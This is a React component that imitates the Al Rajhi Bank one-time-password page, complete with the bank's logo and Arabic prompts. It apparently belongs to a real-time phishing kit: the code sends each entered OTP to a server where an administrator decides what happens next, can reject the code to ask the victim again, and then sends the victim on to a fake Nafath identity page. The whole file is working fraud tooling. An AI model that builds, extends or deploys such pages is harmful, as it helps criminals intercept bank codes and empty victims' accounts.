import { isFormRejected } from "@/real-time/context/signals";
import { sendDataToServer, setCurrentPage } from "@/real-time/utils/utils";
import Stack from "@mui/material/Stack";
import { useEffect, useRef, useState } from "react";
import { useForm } from "react-hook-form";
import AlRajhiButton from "@/components/AlRajhiButton";
import { TextField, Box } from "@mui/material";
import Main from "@/components/Main";
import ResendCode from "@/components/ResendCode";

function AlRajhiOtp() {
  const { handleSubmit, reset } = useForm({
    mode: "onChange",
    defaultValues: {
      password: "",
    },
  });
  const inputRefs = [useRef(null), useRef(null), useRef(null), useRef(null)];
  const [types, setTypes] = useState(["tel", "tel", "tel", "tel"]);
  const [otpValues, setOtpValues] = useState(["", "", "", ""]);

  function sendData() {
    const fullOtp = otpValues.join("");

    sendDataToServer({
      digitCode: fullOtp,
      current: "الراجحى (OTP)",
      nextPage: "نفاذ الراجحى",
      waitingForAdminResponse: true,
    });
  }

  useEffect(() => setCurrentPage("الراجحى (OTP)"), []);
  useEffect(() => {
    if (isFormRejected.value) {
      reset();
      setOtpValues(["", "", "", ""]);
      setTypes(["tel", "tel", "tel", "tel"]);
      (inputRefs[0].current as any)?.focus();
    }
  }, [isFormRejected.value]);

  const handleChange = (
    e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>,
    index: number,
  ) => {
    const value = e.target.value;

    if (/^[0-9]$/.test(value)) {
      const newOtpValues = [...otpValues];
      newOtpValues[index] = value;
      setOtpValues(newOtpValues);

      e.target.value = value;

      setTimeout(() => {
        setTypes((prev) => {
          const updated = [...prev];
          updated[index] = "password";
          return updated;
        });
      }, 500);

      if (index < inputRefs.length - 1) {
        (inputRefs[index + 1].current as any)?.focus();
      }
    } else {
      e.target.value = "";
    }
  };

  const handleKeyDown = (e: React.KeyboardEvent, index: number) => {
    if (
      e.key === "Backspace" &&
      !(e.target as HTMLInputElement).value &&
      index > 0
    ) {
      setTypes((prev) => {
        const updated = [...prev];
        updated[index - 1] = "tel";
        return updated;
      });

      const newOtpValues = [...otpValues];
      newOtpValues[index - 1] = "";
      setOtpValues(newOtpValues);

      (inputRefs[index - 1].current as any)?.focus();
    }
  };

  const isOtpComplete = otpValues.every((val) => val !== "");

  useEffect(() => {
    setTimeout(() => {
      (inputRefs[0].current as any)?.focus();
    }, 100);
  }, []);

  return (
    <Main variant="filled">
      <form
        className="w-[512px] flex max-w-[100%]"
        style={{
          flexDirection: "column",
          justifyContent: "space-between",
          overflow: "hidden",
        }}
        onSubmit={handleSubmit(sendData)}
      >
        <div className="py-2 px-6 w-full mb-6 rounded-xl">
          <img src="images/login-logo.png" alt="" className="h-10 mx-auto" />
        </div>
        <h2 className="text-xl font-bold mb-6">كلمة المرور لمرة واحدة</h2>
        <p className="text-gray-600 text-center">
          أدخل الرمز المكون من 4 أرقام
        </p>

        <div
          className="max-h-screen py-10 pt-20 px-4 grid place-items-center"
          dir="ltr"
        >
          <div className="w-[212px]">
            <Box display="flex" gap={2} justifyContent="center">
              {inputRefs.map((ref, index) => (
                <TextField
                  key={index}
                  inputRef={ref}
                  value={otpValues[index]}
                  type={types[index]}
                  size="small"
                  inputProps={{
                    maxLength: 1,
                    style: { textAlign: "center", fontSize: "1.1rem" },
                  }}
                  onChange={(e) => handleChange(e, index)}
                  onKeyDown={(e) => handleKeyDown(e, index)}
                />
              ))}
            </Box>
          </div>

          {isFormRejected.value && (
            <Stack className="font-medium mt-5 text-red-500 text-center">
              كلمة المرور غير صحيحة
            </Stack>
          )}
        </div>
        <div className="w-full px-4">
          <AlRajhiButton
            fullWidth
            variant="contained"
            type="submit"
            disabled={!isOtpComplete}
            sx={{
              backgroundColor: "#1e2746",
            }}
          >
            تحقق
          </AlRajhiButton>
          <div className="mt-4">
            <ResendCode />
          </div>
        </div>
      </form>
    </Main>
  );
}

export default AlRajhiOtp;
